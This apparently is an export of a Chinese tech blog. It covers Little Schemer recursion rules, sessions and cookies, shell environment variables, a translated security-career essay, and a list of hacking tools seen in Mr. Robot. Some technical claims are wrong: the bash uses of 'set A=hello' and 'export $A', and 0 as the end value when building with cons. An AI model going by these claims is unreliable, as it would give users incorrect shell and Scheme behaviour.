<p>当对一个数字 <em>n</em> 进行递归调用时，询问两个有关 <em>n</em> 的问题：*(zero? n)* 和 <strong>else</strong>。</p>
<p>当对一个S-表达式列表 <em>l</em> 进行递归调用时，询问三个有关 <em>l</em> 的问题：*(null? lat)<em>、</em>(atom? (car l))* 和 <strong>else</strong>。</p>
<h3 id="第二诫"><a href="#第二诫" class="headerlink" title="第二诫"></a>第二诫</h3><p>使用 <em>cons</em> 来构建列表。</p>
<h3 id="第三诫"><a href="#第三诫" class="headerlink" title="第三诫"></a>第三诫</h3><p>构建一个列表的时候，描述第一个典型元素，之后 <em>cons</em> 该元素到一般性递归（natural recursion）上。</p>
<h3 id="第四诫"><a href="#第四诫" class="headerlink" title="第四诫"></a>第四诫</h3><p>在递归时总是改变至少一个参数。当对一个原子列表 <em>lat</em> 进行递归调用时，使用 *(cdr lat)*。当对数字 <em>n</em> 进行递归调用时，使用 *(sub1 n)*。当对一个S-表达式 <em>l</em> 进行递归调用时，只要是 <em>(null? l)</em> 和 <em>(atom? (car l))</em> 都不为 true，那么就同时使用 <em>(car l)</em> 和 *(cdr l)*。</p>
<p>在递归时改变的参数，必须向着不断接近结束条件而改变。改变的参数必须在结束条件中得以测试：<br>    当使用 <em>cdr</em> 时，用 <em>null?</em> 测试是否结束；<br>    当使用 <em>sub1</em> 时,用 <em>zero?</em> 测试是否结束。</p>
<h3 id="第五诫"><a href="#第五诫" class="headerlink" title="第五诫"></a>第五诫</h3><p>当用 ➕ 构建一个值时，总是使用 0 作为结束代码行的值，因为加上 0 不会改变加法的值。</p>
<p>当用 ✖ 构建一个值时，总是使用 1 作为结柬代码行的值，因为乘以 1 不会改变乘法的值。</p>
<p>当用 <em>cons</em> 构建一个值时，总是考虑把 0 作为结束代码行的值。</p>
<h3 id="第六诫"><a href="#第六诫" class="headerlink" title="第六诫"></a>第六诫</h3><p>简化工作只在功能正确之后开展。</p>
<h3 id="第七诫"><a href="#第七诫" class="headerlink" title="第七诫"></a>第七诫</h3><p>对具有相同性质的 <em>subparts</em>（子部件）进行递归调用：</p>
<ul>
<li>列表的子列表。</li>
<li>算术表达式的子表达式。</li>
</ul>
<h3 id="第八诫"><a href="#第八诫" class="headerlink" title="第八诫"></a>第八诫</h3><p>使用辅助函数来抽象表示方式。</p>
<h3 id="第九诫"><a href="#第九诫" class="headerlink" title="第九诫"></a>第九诫</h3><p>用函数来抽象通用模式。</p>
<h3 id="第十诫"><a href="#第十诫" class="headerlink" title="第十诫"></a>第十诫</h3><p>构建函数,一次收集多个值。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>函数式编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Session、Cookie 和 Token</title>
    <url>/2021/02/25/session-cookie-token/</url>
    <content><![CDATA[<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 是一种抽象的概念，它不止存在于 HTTP 中，在计算机的众多领域都有它的身影，比如在 SSH、tmux 中都有 Session 的出现。</p>
<p>Session 被直译为<strong>会话</strong>，顾名思义，它指客户端和服务器之间的连接会话。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie 是一种具体的技术，它常被用在 HTTP 中，在其他领域很少见到 Cookie 的身影。</p>
<p>Cookie 可以理解为是 Session 这种概念的一种实现，通过 Cookie 可以确定客户端和服务器之间的连接会话，从而使无状态的 HTTP 协议有状态。</p>
<p>除 Cookie 之外，还可以使用带参数的 URL 来实现 Session 这种概念。</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>Token 直译为<strong>令牌</strong>，顾名思义，它常被用以客户端和服务器之间的身份认证。</p>
<p>Cookie 不仅可以用来实现上述的这种身份认证，也可以用来实现类似购物车这种场景。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>set、env 与 export</title>
    <url>/2018/05/09/set-env-export/</url>
    <content><![CDATA[<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p><strong>环境变量</strong>，顾名思义由<strong>环境</strong>和<strong>变量</strong>两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell 也是如此，同样的，通过 Shell 所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。</p>
<p>在 Linux 中，环境变量可以大致分为 <strong>Shell 环境变量</strong>和<strong>用户环境变量</strong>两大类，不同的 Shell 有不同的 Shell 环境变量，例如 bash 与 Zsh 的 Shell 环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell 环境变量包含了用户环境变量。</p>
<p>在 Linux 中可以使用 <code>declare</code> 命令直接定义 <strong>Shell 环境变量</strong>，如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义Shell环境变量A，值为hello，注意等号两边不能有空格</span></span><br><span class="line"><span class="comment"># 按照传统，环境变量一般为全大写</span></span><br><span class="line"><span class="built_in">declare</span> A=hello</span><br></pre></td></tr></table></figure>

<p>同样的，在 Linux 中使用 <code>echo</code> 命令即可打印环境变量的值，如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印A的值，环境变量前需加“$”符号，</span></span><br><span class="line"><span class="comment"># 表示要打印的是环境变量而不是一般字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$A</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，这种定义只对当前终端有效，关闭终端后失效。</p>
<p>常见的 Shell 环境变量有：</p>
<ul>
<li>COLUMNS：当前终端的宽度</li>
<li>LINES：当前终端的高度</li>
</ul>
<p>常见的用户环境变量有：</p>
<ul>
<li>PATH：用以指定命令的搜索目录</li>
<li>HOME：用以指定用户的家目录</li>
<li>SHELL：用以指定用户的登录 Shell</li>
<li>HTTP_PROXY：用以指定终端的 HTTP 代理信息，与下一个变量要同时设置</li>
<li>HTTPS_PROXY：用以指定终端的 HTTPS 代理信息</li>
</ul>
<span id="more"></span>

<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p><code>set</code> 命令用来显示或设置 <strong>Shell 环境变量</strong>，当不带参数运行时默认显示所有已定义的 Shell 环境变量，若要设置环境变量可采用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> A=hello</span><br></pre></td></tr></table></figure>

<p>值得注意的是，当 <code>declare</code> 命令不带任何参数运行时，也会显示所有的 Shell 环境变量，但它比 <code>set</code> 显示的结果要更加清晰。</p>
<p>关于 set 命令更多的参数使用说明可参考 <a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash脚本set命令教程</a></p>
<h2 id="env（仅限于-Linux）"><a href="#env（仅限于-Linux）" class="headerlink" title="env（仅限于 Linux）"></a>env（仅限于 Linux）</h2><p><code>env</code> 命令用来显示或设置<strong>用户环境变量</strong>，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="export（仅限于-Linux）"><a href="#export（仅限于-Linux）" class="headerlink" title="export（仅限于 Linux）"></a>export（仅限于 Linux）</h2><p><code>export</code> 命令用来显示或设置当前导出至用户环境变量的 Shell 环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的 Shell 环境变量，若要导出某 Shell 环境变量到用户环境变量可采用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> A=hello</span><br></pre></td></tr></table></figure>

<p>这一步操作实际上完成了两步操作，即：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">declare</span> A=hello  <span class="comment">#定义一个Shell环境变量$a</span></span><br><span class="line"><span class="built_in">export</span> <span class="variable">$A</span>  <span class="comment">#导出至用户环境变量</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>那么，你想在安全行业工作吗？</title>
    <url>/2018/09/18/so-you-want-to-work-in-security/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23">https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23</a> ，正文如下：</p>
<p>每隔一段时间，我就会收到一封来自陌生人的电子邮件，询问有关如何从事安全行业（计算机，信息，网络等等）的建议。这很棒！我们需要更多充满激情，富有创造力和勤奋工作的人，他们希望努力使技术更安全。它也是一种非常经济稳定的谋生方式。关于这个确切的话题还有很多其他帖子，但我会根据自己的经验提出一些高层次的想法。<br><img src="https://cdn-images-1.medium.com/max/1000/1*Z7BjkasC8Kx5JtZ7N5Pe2A.gif" alt="不像电影"></p>
<span id="more"></span>

<h2 id="警告：这不像电影"><a href="#警告：这不像电影" class="headerlink" title="警告：这不像电影"></a>警告：这不像电影</h2><p>在安全方面工作并不像好莱坞所描绘的那样。我喜欢观看黑客风格的电影和节目，以获得幻想和逃避，但日常工作并不像在屏幕上看起来那样快速和性感（就我的经验来说）。<br>现在，对于大多数职业来说都是如此，即使我从未花费一天时间在地下巢穴中解读流媒体代码，我仍然认为这是一个令人兴奋，重要，具有挑战性和有益的领域。</p>
<h2 id="没有标准或完美的课程"><a href="#没有标准或完美的课程" class="headerlink" title="没有标准或完美的课程"></a>没有标准或完美的课程</h2><p>安全是一个广泛的，跨学科的应用领域。有设计和构建安全系统的人，尝试破坏系统的人，尝试检测入侵的人以及介于两者之间的大量事物。如果我学到了什么，我就知道没有单一的，标准的或最好的准备路径。也许这会随着领域的成熟而改变，但我对此表示怀疑。它也不像其他需要认证的专业领域（例如医学，法律），这既可以是解放也可以是恐吓。<br>独立于你如何获得它，你将受益于对应用计算机科学或计算机和软件的工作方式的强烈理解。<strong>许多应用计算机科学都是关于解决抽象层的问题，安全性通常是在这些抽象中找到有缺陷的假设......然后找出如何最好地修复（或利用）它们。</strong><br>我是通过从公立大学获得计算机科学工程学位来做到这一点的。对我来说，一些更有用的主题是操作系统，网络，计算机体系结构和编译器。除此之外，我也参加了我感兴趣的技术课程（例如数字信号处理，生物医学工程，人工智能），并通过学生俱乐部和实习中的项目工作探索了网络，隐私增强技术和（网络，客户端）应用安全方面的安全主题。<br>你还将从了解使用技术的人（用户，客户等）的工作方式中获益。如果我能回到我的大学时代，我会参加一些心理学，社会学和人文因素课程。<br>我与具有相似传统学术背景的专家（例如计算机工程，计算机科学，数学等学位）工作过。我也认识很多不太具有典型背景的人（例如化学，电影研究，心理学，平面设计）和一些在完成学位之前辍学的人。<br>关于安全认证的话题，我没有任何一个认证，我不认为我因此而被拒之门外。有些行业或国家可能会要求他们为信息安全专业人士提供服务，他们肯定是一些合理的人所追求的 - 告诫者！<br>在文化方面，我建议阅读<a href="https://en.wikipedia.org/wiki/Hacker_Manifesto">黑客宣言</a>或<a href="https://translations.readthedocs.io/en/latest/">如何成为一名黑客</a>，这对许多安全专家来说都是灵感和道德的指南针。 即使你不把自己比作黑客，理解和你一起工作的一些人的心态也是有帮助的。<br>除此之外，我所知道的大部分知识都是随着时间的推移，从朋友和同事的轶事，安全博客，会议论文和演示文稿，邮件列表，本地安全组和其他在线资源中学到的。我今天听到或摄取的很多东西都来自<a href="https://twitter.com/laparisa/lists/security">我的Twitter安全列表</a>上的人。</p>
<h2 id="停止阅读，开始做"><a href="#停止阅读，开始做" class="headerlink" title="停止阅读，开始做"></a>停止阅读，开始做</h2><p><img src="https://cdn-images-1.medium.com/max/1000/1*Q7FRcfOGAAIJoADz0KvTIQ.gif" alt="标题图"><br>这适用于任何职业追求，但尽可能快地获得一些真实的工作经验。这是缩小你的兴趣，优势和未来发展领域的最佳方式。你还可以更好地了解正常工作日和环境的组成，包括你喜欢和不喜欢的内容。我生命中最有价值的职业相关经历之一是做了一个我讨厌的实习，因为它，所以我强烈地转向了另一个方向:)<br>在如何开始获得经验方面，我没有一个简单的答案。查看招聘会和会议，参与俱乐部或其他组织，以大胆的热情申请实习和兼职工作。在来谷歌之前，我在一个特许摊位清理干燥的nacho奶酪，这是我作为社区游泳池救生员定期轮班的一部分。这一点工作经验帮助我获得了大学宿舍管理员的工作，这在一家大型制药公司的IT实习面试时无疑是相关的。我在大学的俱乐部获得了一些“真实”（即非课程）软件体验，并且我在学校新闻组上发现了一个网络安全实习机会，这可能给了我足够的相关工作经验，让谷歌的某个人考虑为我安排一个面试。</p>
<h2 id="写代码"><a href="#写代码" class="headerlink" title="写代码"></a>写代码</h2><p>我认识的最好的安全工程师也在积极编写代码。这为他们提供了编写软件的第一手经验，包括无意中但不可避免地引入了安全漏洞。后者迫使所有开发者真正感同身受。毕竟，一直编写安全代码通常比指出不安全的代码更难。<br>如果你坚持从一个大型项目开始，请尝试修复开源项目中的错误。每个人都喜欢修复bug的人！该项目将感谢你，这通常是一种获得真实体验的好方法，也是你未来工作的好方法。</p>
<h2 id="破坏代码"><a href="#破坏代码" class="headerlink" title="破坏代码"></a>破坏代码</h2><p>花时间寻找软件bug。了解如何使用调试器，网络扫描程序，Web调试代理和软件模糊测试。花时间在黑客游乐场，可用于所有技能水平。我在大学时第一次使用 <a href="https://www.hackthissite.org/">https://www.hackthissite.org</a> ，并在 <a href="https://infosec.rocks/">https://infosec.rocks</a> 列出了其他一些自我指导的黑客培训网站。还有一个很好的黑客挑战、比赛列表（例如CTF），不想浪费时间的人可以点<a href="https://security.stackexchange.com/questions/3592/what-hacking-competitions-challenges-exist">这里</a>。或者查找并报告你使用的实际软件中的bug。有<a href="https://www.bugcrowd.com/bug-bounty-list/">许多软件供应商为安全漏洞提供现金奖励</a>，包括<a href="https://www.google.com/about/appsecurity/chrome-rewards/">Chrome</a>和<a href="https://www.google.com/about/appsecurity/reward-program/">Google</a>，以及<a href="https://www.hackerone.com/internet-bug-bounty">Internet Bug Bounty</a>计划涵盖的一些核心开源项目。<br>除了自己找到错误之外，我还建议你继续学习并了解其他人的发现（<a href="https://seclists.org/bugtraq/">bugtraq</a>，<a href="https://seclists.org/fulldisclosure/">fulldisclosure</a>，<a href="https://seclists.org/oss-sec/">oss-sec</a>）。</p>
<h2 id="分享知识"><a href="#分享知识" class="headerlink" title="分享知识"></a>分享知识</h2><p>我开始了解安全是从大学中由同龄人组织的一个名为<a href="https://www-s.acm.illinois.edu/mailman/listinfo/sigmil-l">SigMil</a>的特别有趣的ACM小组中，成员们会对他们感兴趣的安全主题进行粗略的演示。我们还参加了一年一度的<a href="https://www.defcon.org/">DEFCON</a>朝圣之旅，参加会谈（十年前要做的事情要容易得多），购买安全<a href="https://www.defcon.org/html/links/book-list.html">书籍</a>或<a href="https://www.2600.com/">杂志</a>，或者只是与来自世界其他地方的志同道合的人聊聊他们的工作。在Google，我直接从同行那里学到了很多东西，分享他们的专业知识，斗争和半生不熟的想法。<br>分享知识很重要，原因如下：</p>
<ol>
<li>分享知识是在大型组织或项目中扩展最佳安全实践（或避免陷阱）的必要且有效的方法。</li>
<li>我几乎总是在准备演示文稿或编写文档时自己学习一些东西，因此对于我来说，发现一个主题的隐藏角落是一个很好的强制功能。</li>
<li>我几乎总是从读者那里学到一些东西，无论是问题，评论还是后续讨论。</li>
<li>把爱传出去。</li>
</ol>
<h2 id="练习你的沟通"><a href="#练习你的沟通" class="headerlink" title="练习你的沟通"></a>练习你的沟通</h2><p>在安全方面工作意味着你需要定期向不同的受众解释复杂的技术问题，每个受众都有不同的词汇，专业知识和激励措施。在描述漏洞的严重性时，你很少会依赖通用指标，在推广最佳安全实践时也不会有任何闪亮的东西。面对<a href="https://zh.wikipedia.org/zh-cn/FUD">FUD(即恐惧、不确定、怀疑)</a>，你必须让人们不受欢迎，然后专注于危机之外的行动。<br>所有这些都需要沟通艺术方面的技能，特别是解释和谈判。你不可能从纯粹的技术资源中掌握这门艺术，所以练习，发表，并永远致力于改进。</p>
<h2 id="期望努力工作，有时会失败"><a href="#期望努力工作，有时会失败" class="headerlink" title="期望努力工作，有时会失败"></a>期望努力工作，有时会失败</h2><p><img src="https://cdn-images-1.medium.com/max/1000/1*0iQlhQQUroM4_A1zAW6n3w.gif" alt="标题图"><br>也许这很明显，但值得明确表示。<br>安全是挑战性工作。你需要不断学习新事物，因为你需要保护的技术环境正在快速发展，这比我们弃用旧的，尚未完全安全的内容的能力要快得多。经常有时间和资源的威胁行动者也能很快适应现有的防御。<br>安全可能会有压力。你正在处理模棱两可的问题，不完善的解决方案，有限的数据以及对人类安全的真正威胁。<br>很难用安全性衡量成功，根据我的经验，人们更有可能注意到失败。 在确保现实世界技术的同时，我们最终还是在减轻风险的过程中，无论RSA供应商的某个人告诉你什么，都没有银弹。</p>
<h2 id="（尝试）保持乐观"><a href="#（尝试）保持乐观" class="headerlink" title="（尝试）保持乐观"></a>（尝试）保持乐观</h2><p>由于我刚才概述的一些原因，这个领域可能令人沮丧。跟上技术和开发的创新速度似乎是不可能的。 我的意思是，缓冲区溢出漏洞已存在数十年，但我们今天（2016）仍然经常看到利用它们的高影响漏洞。你会经常听到人们尖叫安全是不可能的，而且情况正在恶化，或者<a href="https://lcamtuf.blogspot.com/2010/05/security-engineering-broken-promises.html">说出我们为什么都失败的完全雄辩点</a>。<br>现实可能是苛刻的，但如果我们专注于积极思考并考虑技术所提供的所有东西，那真是令人印象深刻！这不完美。它永远不会是完美的。但我认为当今安全的最前沿比10年前要好得多，我们可以通过一定程度的合理保证做一些相当令人印象深刻的事情，这让我感到乐观。</p>
<h2 id="请求帮忙"><a href="#请求帮忙" class="headerlink" title="请求帮忙"></a>请求帮忙</h2><p>如果你遇到混蛋，不要气馁。多年来，我在信息安全行业看到了大量的沙文主义和自我主义者。通过对话（在线，会议等等）快速变成谁是最精英的人并不罕见。<br>也许这不是每个人的经历，但我在很大程度上取得了成功，这得益于我现在认为是朋友的许多优秀安全人员的支持，建议，指导和帮助。仅仅因为你必须寻求帮助并不意味着你不会因为这项工作而被裁掉。<br>如果您需要帮助，请尽管问。<strong>只要确保你做尽职调查，尽可能让人们帮助你。</strong>大多数专家都非常忙碌，所以如果你问一个有足够背景和没有拼写错误的好问题，你就更有可能获得有用的回应。</p>
<h2 id="祝你好运并且快乐Hacking"><a href="#祝你好运并且快乐Hacking" class="headerlink" title="祝你好运并且快乐Hacking"></a>祝你好运并且快乐Hacking</h2><p>我偶然发现了一些其他安全职业建议的想法：</p>
<ul>
<li>Thomas Ptacek，Charlie Miller，Jeremiah Grossman，Richard Bejtlich和Bruce Schneier分享了他们的想法 <a href="http://krebsonsecurity.com/tag/security-career-advice/">http://krebsonsecurity.com/tag/security-career-advice/</a></li>
<li>我的朋友并且是Chrome同事Chris Palmer分享了可靠的建议 <a href="https://noncombatant.org/2016/06/20/get-into-security-engineering">https://noncombatant.org/2016/06/20/get-into-security-engineering</a></li>
<li>Michal Zalewski（又叫做lcamt​​uf）根据他在安全方面20年（令人敬畏的，经常是开创性的）的工作分享了4个简单的经验：<a href="https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html">https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html</a></li>
</ul>
<h2 id="译者注"><a href="#译者注" class="headerlink" title="译者注"></a>译者注</h2><p>本文作者为<a href="https://en.wikipedia.org/wiki/Parisa_Tabriz">Parisa Tabriz</a>，她是计算机安全专家，曾在谷歌担任工程总监。由于她在黑客和互联网安全方面的经验，她被称为谷歌的“安全公主”。2012年，“福布斯”杂志将她列入“30位30岁以下技术行业观察人员”名单。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title>《黑客军团》中使用的软件</title>
    <url>/2018/09/18/software-used-in-mr-robot/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://alternativeto.net/list/66/software-used-in-mr-robot">https://alternativeto.net/list/66/software-used-in-mr-robot</a> ，正文如下：</p>
<p><img src="https://p0.ssl.qhimg.com/t01708531e12a86f171.jpg" alt="首页图片"><br>本文盘点了获得艾美奖和金球奖剧情/惊悚系列电视剧——《黑客军团》中黑客使用的软件。<br><strong>下面的列表包含到了第二季第11集！</strong></p>
<span id="more"></span>

<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a><a href="https://www.kali.org/">Kali Linux</a></h2><p>Kali Linux是针对安全研究人员进行渗透测试的Linux发行版，但同时也被黑客使用，因为它集成了很多黑客工具。由于它是黑客的首选操作系统，所以它在《黑客军团》中经常有过出现。</p>
<h2 id="Wickr"><a href="#Wickr" class="headerlink" title="Wickr"></a><a href="https://wickr.com/">Wickr</a></h2><p>Wickr是一个端到端的加密聊天应用程序，具有诸如消息可调到期时间等功能。在第二季中，fsociety组织使用它来保密通信。</p>
<h2 id="Tor-Browser"><a href="#Tor-Browser" class="headerlink" title="Tor Browser"></a><a href="https://www.torproject.org/projects/torbrowser.html">Tor Browser</a></h2><p>Tor浏览器被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，当第二季第8集中fsociety的成员Trenton用Tor浏览器向Vimeo上传一个泄露的关于非法群体监视的FBI电话会议时，利用到了它。</p>
<h2 id="Raspberry-Pi"><a href="#Raspberry-Pi" class="headerlink" title="Raspberry Pi"></a><a href="https://www.raspberrypi.org/">Raspberry Pi</a></h2><p>树莓派是一个小型的，可编程的计算机板，旨在教孩子们学习计算机科学。由于它的低成本，多功能性和简单性，它也是业余爱好者和程序员的最爱。第一季第5集中Elliot将一个树莓派安装到铁山的气候控制系统中，以便fsociety后期可以远程升高存储E公司磁带备份的存储空间的温度，从而实现美国消费者债务的很大一部分记录的备份被销毁。</p>
<h2 id="FileZilla"><a href="#FileZilla" class="headerlink" title="FileZilla"></a><a href="https://filezilla-project.org/">FileZilla</a></h2><p>FileZilla是世界上最流行的FTP客户端，并且是最强大和用户友好的客户端之一。在第一季第4集中Trenton使用FileZilla上传一个漏洞利用程序到fsociety的FTP服务器上，即Elliot将安装在铁山的气候控制系统中的树莓派，以销毁美国消费者债务中很大一部分的记录。</p>
<h2 id="Pwnix"><a href="#Pwnix" class="headerlink" title="Pwnix"></a><a href="https://www.pwnieexpress.com/mobile-line-shift-to-aopp">Pwnix</a></h2><p>Pwnix是一个为渗透测试人员定制的用于网络黑客和安全的Android ROM。Elliot在第二季第9集中使用了一个Pwnie Express Pwn Phone（Pwnix预装），以至于他和Darlene渗透进黑暗军团的电话。</p>
<h2 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a><a href="http://jpinsoft.net/deepsound">DeepSound</a></h2><p>在第一季第8集中，Elliot使用DeepSound将文件隐藏在CD的常规音乐曲目中，以便隐藏文件只能使用DeepSound软件查看。这是一种被称为隐写术的技术。</p>
<h2 id="ProtonMail"><a href="#ProtonMail" class="headerlink" title="ProtonMail"></a><a href="https://protonmail.com/">ProtonMail</a></h2><p>ProtonMail是一个安全的端到端加密电子邮件服务，基于瑞士，Elliot在第一季第8集中使用过。《黑客军团》背后的团队研究安全电子邮件服务的程度很深，以至于他们实际上联系了ProtonMail开发者，询问用户是否有可能在ProtonMail中监控他们自己的电子邮件活动。ProtonMail开发者非常喜欢帐户访问日志的想法，他们最终在ProtonMail的v2.0版本中实现了这个功能。想要了解更多请访问：<a href="https://protonmail.com/blog/protonmail-mr-robot-secure-email/">https://protonmail.com/blog/protonmail-mr-robot-secure-email/</a></p>
<h2 id="HDShredder"><a href="#HDShredder" class="headerlink" title="HDShredder"></a><a href="https://www.miray-software.com/products/applications/hdshredder.html#">HDShredder</a></h2><p>HDShredder 4企业版在第一季第10集中用于在E公司被黑之后安全地擦除所有fsociety的硬盘信息，然后他们在狗狗火葬场焚烧所有的硬盘。</p>
<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a><a href="https://www.openwall.com/john/">John the Ripper</a></h2><p>John the Ripper是Kali Linux中包含的一个密码破解工具，用于检测简单的Unix密码，并试图通过每秒数千次的猜测来破解它们。这被称为暴力破解，Elliot在第一季第2集中通过使用它来破解E公司的临时首席技术官Tyrell Wellick的邮箱密码。</p>
<h2 id="Wegt"><a href="#Wegt" class="headerlink" title="Wegt"></a><a href="https://www.gnu.org/software/wget/">Wegt</a></h2><p>Wget是一个命令行工具，可以发出HTTP(S)请求。在《黑客军团》中它被用于与John the Ripper结合使用Shellshock漏洞来攻击E公司的邮件服务器。</p>
<h2 id="Social-Engineer-Toolkit"><a href="#Social-Engineer-Toolkit" class="headerlink" title="Social-Engineer Toolkit"></a><a href="https://github.com/trustedsec/social-engineer-toolkit">Social-Engineer Toolkit</a></h2><p>SET是一个专注于诸如网络钓鱼等社会工程攻击的测试框架。社会工程学欺骗受害者给予攻击者敏感信息。在第一季第5集中，Mobley使用SET的伪造短信功能让主管离开铁山，以便Elliot可以渗透进去。</p>
<h2 id="OpenWrt"><a href="#OpenWrt" class="headerlink" title="OpenWrt"></a><a href="https://openwrt.org/">OpenWrt</a></h2><p>OpenWrt是Angela在第二季第6集中黑进FBI时使用的路由器固件。</p>
<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h2><p>mimikatz是一个后渗透工具，它将黑客可能需要执行的一些有用任务捆绑在一起。在第二季第6集中，它被装在USB橡皮鸭中并交给Angela，作为一个备份计划。</p>
<h2 id="btscanner"><a href="#btscanner" class="headerlink" title="btscanner"></a><a href="https://www.pentest.co.uk/downloads.html">btscanner</a></h2><p>btscanner是一个包含在Kali Linux中的工具，它可以在无需配对的情况下提取关于蓝牙设备的尽可能多的信息。在第一季第6集中，Elliot使用btscanner与Bluesniff和Metasploit结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
<h2 id="Bluesniff"><a href="#Bluesniff" class="headerlink" title="Bluesniff"></a><a href="http://bluesniff.shmoo.com/">Bluesniff</a></h2><p>Bluesniff是一款蓝牙设备发现工具。在第一季第6集中，Elliot使用Bluesniff与Metasploit和btscanner结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
<h2 id="KVM-Kernel-base-Virtual-Machine"><a href="#KVM-Kernel-base-Virtual-Machine" class="headerlink" title="KVM(Kernel-base Virtual Machine)"></a><a href="http://www.linux-kvm.org/page/Main_Page">KVM(Kernel-base Virtual Machine)</a></h2><p>KVM是一个管理程序，它是一个可以通过虚拟机运行其他操作系统的软件。Elliot使用KVM在Kali Linux内虚拟化Windows 7。在第一季第8集中，它使用KVM运行DeepSound。</p>
<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://metasploit.com/">Metasploit</a></h2><p>Metasploit框架是Kali Linux中包含的一个软件，可以使渗透测试人员更容易发现网络中的漏洞。Meterpreter是可以在Metasploit框架中运行的数百个Payload之一，并且在第一季第6集中使用到。在第一季第6集中，Elliot使用Metasploit Framwork和Metapreter与btscanner和Bluesniff结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。</p>
<h2 id="Framaroot"><a href="#Framaroot" class="headerlink" title="Framaroot"></a><a href="https://forum.xda-developers.com/apps/framaroot/root-framaroot-one-click-apk-to-root-t2130276">Framaroot</a></h2><p>在电视中称为RooterFrame的Framaroot，在第一季第3集中被Tyrell Wellick用来Root同事的Android手机，这样他就可以隐藏在手机上安装的FlexiSPY间谍软件，以便获得关于谁将成为E公司的下一任首席技术官的秘密信息。</p>
<h2 id="Kingo-Root"><a href="#Kingo-Root" class="headerlink" title="Kingo Root"></a><a href="https://zh.kingoapp.com/">Kingo Root</a></h2><p>Tyrell Wellick在第一季第3集中使用Kingo Root来Root同事的Android手机，这样他就可以在手机上隐蔽地安装FlexiSPY间谍软件，以便获得有关谁将成为下一任E公司首席执行官的秘密信息。</p>
<h2 id="FlexiSPY"><a href="#FlexiSPY" class="headerlink" title="FlexiSPY"></a><a href="https://www.flexispy.com/zh/">FlexiSPY</a></h2><p>FlexiSPY是针对Android，iOS和BlackBerry的间谍软件，允许用户监控受害者手机上的所有活动。在第一季第3集中，Tyrell Wellick秘密地将其安装在同事的Android手机上，以获取有关谁将成为下一任E公司首席技术官的秘密信息。</p>
<h2 id="SuperSU"><a href="#SuperSU" class="headerlink" title="SuperSU"></a><a href="http://www.supersu.com/">SuperSU</a></h2><p>SuperSU是一个在已Root的Android手机上管理超级用户权限的应用程序。在第一季第3集中，Tyrell Wellick在同事的Android手机上秘密安装了FlexiSPY —— 它使用SuperSU为它自己提供超级用户访问 —— 以便获得有关谁将成为下一任E公司首席技术官的秘密信息。</p>
<h2 id="can-utils"><a href="#can-utils" class="headerlink" title="can-utils"></a><a href="https://packages.debian.org/sid/can-utils">can-utils</a></h2><p>can-utils包含与汽车电脑有关的实用程序。其中一个工具被称为candump，它在《黑客军团》中被用于入侵汽车的电脑。</p>
<h2 id="radare"><a href="#radare" class="headerlink" title="radare"></a><a href="https://www.radare.org/r/">radare</a></h2><p>radare2是Tyrell Wellick在第二季第12集中使用的逆向工程框架。</p>
<h2 id="PyCharm"><a href="#PyCharm" class="headerlink" title="PyCharm"></a><a href="https://www.jetbrains.com/pycharm/">PyCharm</a></h2><p>PyCharm是一个Python和Django的IDE（集成开发环境），它是一种代码编辑软件。Trenton在第一季第四集中使用它。</p>
